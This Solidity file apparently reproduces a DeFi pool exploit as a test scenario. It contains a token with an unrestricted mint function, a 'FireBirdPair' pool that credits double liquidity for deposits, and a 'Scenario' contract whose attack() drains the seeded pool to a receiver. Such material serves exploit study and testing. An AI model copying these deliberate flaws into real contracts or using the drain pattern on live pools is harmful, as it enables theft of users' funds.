// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
contract FireBirdToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function approve(address a,uint256 n) external returns(bool){allowance[msg.sender][a]=n;return true;} function transferFrom(address f,address t,uint256 n) external returns(bool){require(allowance[f][msg.sender]>=n);allowance[f][msg.sender]-=n;require(balanceOf[f]>=n);balanceOf[f]-=n;balanceOf[t]+=n;return true;} function mint(address a,uint256 n) external {balanceOf[a]+=n;} function transfer(address a,uint256 n) external returns(bool){require(balanceOf[msg.sender]>=n);balanceOf[msg.sender]-=n;balanceOf[a]+=n;return true;} }
contract FireBirdPair { FireBirdToken public immutable asset; uint256 public liquidity; address public immutable admin; constructor(FireBirdToken a){asset=a;admin=msg.sender;}
function mint(address to,uint256 n) external { asset.transferFrom(msg.sender,address(this),n); liquidity+=n*2; } function burn(address to,uint256 n) external { require(liquidity>=n); liquidity-=n; asset.transfer(to,n); }
}
contract Scenario { FireBirdToken public asset; FireBirdPair public target; address public victim; uint256 public constant SEED=1000000 ether; constructor(){asset=new FireBirdToken();target=new FireBirdPair(asset);victim=address(target); asset.mint(victim,SEED); asset.mint(address(this),SEED);}
function attack(address receiver) external { asset.approve(address(target),SEED); target.mint(address(this),SEED/2); target.burn(receiver,SEED); }
function reserveBalance() external view returns(uint256){return asset.balanceOf(victim);}
function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);}
function assetAddress() external view returns(address){return address(asset);}
}
